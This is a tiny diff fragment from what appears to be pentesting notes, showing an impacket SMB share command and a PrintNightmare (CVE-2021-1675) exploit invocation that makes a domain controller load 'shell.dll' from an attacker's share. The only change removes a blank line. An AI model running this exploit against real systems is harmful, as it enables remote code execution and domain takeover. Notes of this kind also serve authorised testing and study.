@@ -181,4 +181,3 @@ smbserver.py share `pwd` -smb2support
 ```bash
 python3 CVE-2021-1675.py <DC>/<user>:<Password>@<DC IP> '\\<LHOST>\share\shell.dll'
 ```
-
